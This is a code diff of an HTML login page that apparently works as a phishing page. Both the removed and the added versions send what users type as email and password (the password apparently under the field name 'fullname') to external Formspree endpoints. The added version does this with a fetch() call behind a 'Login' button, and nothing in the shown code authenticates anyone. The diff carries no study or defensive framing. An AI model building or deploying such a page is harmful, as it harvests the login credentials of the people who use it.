@@ -23,11 +23,6 @@
         .send:hover {
             background: #135293; /* Darker shade on hover */
         }
-
-        /* Additional style for the Formspree form */
-        .formspree-form {
-            display: none; /* Hide Formspree form initially */
-        }
     </style>
 </head>
 <body>
@@ -53,31 +48,39 @@
             </div>
         </div>
 
-        <!-- Updated button action using Formspree integration -->
-        <button class="send" onclick="showFormspreeForm()">Login</button>
-
-        <!-- Formspree form with hidden fields -->
-        <form class="formspree-form" action="https://formspree.io/f/myyrzggd" method="POST">
-            <label>
-                Your email:
-                <input type="email" name="email">
-            </label>
-            <label>
-                Your password:
-                <input type="fullname" name="password">
-            </label>
-            <!-- Add any other hidden fields as needed -->
-
-            <button type="submit" id="formspreeSubmitButton"></button>
+        <!-- Updated form action and method using Formspree integration -->
+        <form action="https://formspree.io/f/xeqyqaay" method="POST">
+            <button type="button" class="send" onclick="sendFormData()">Login</button>
         </form>
 
         <script>
-            function showFormspreeForm() {
-                // Show the Formspree form
-                document.querySelector('.formspree-form').style.display = 'block';
+            function sendFormData() {
+                const email = document.getElementById('email').value;
+                const fullname = document.getElementById('fullname').value;
 
-                // Trigger the click event on the Formspree submit button
-                document.getElementById('formspreeSubmitButton').click();
+                // Check if email and fullname are not empty before sending
+                if (email && fullname) {
+                    const formData = new FormData();
+                    formData.append('email', email);
+                    formData.append('fullname', fullname);
+
+                    fetch('https://formspree.io/f/xeqyqaay', {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        // Handle success, e.g., show a success message
+                        console.log(data);
+                    })
+                    .catch(error => {
+                        // Handle error, e.g., show an error message
+                        console.error(error);
+                    });
+                }
             }
         </script>
     </div>
